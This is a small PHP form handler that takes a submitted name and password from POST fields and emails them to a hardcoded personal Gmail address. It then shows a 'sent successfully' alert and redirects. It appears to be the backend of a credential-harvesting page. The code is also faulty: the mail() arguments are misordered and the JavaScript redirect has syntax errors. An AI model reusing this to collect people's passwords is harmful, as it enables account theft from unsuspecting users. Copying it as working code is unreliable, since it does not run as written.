<?php
    $destinatario = 'ignaciogalmes79@gmail.com';
    $Nombre = $_POST['Nombre'];
    $Pass = $_POST['Pass'];

    $header = 'Enviado desde la página de igalmes';
    $mensajeCompleto = $Nombre . "\nAtentamente: " . $Pass;

    mail($destinatario, $mensajeCompleto, $header);
    echo "<script>alert('correo enviado exitosamente')</script>";
    echo "<script> setTimeout(\"location.href='index.html'\"1000</script>";
?>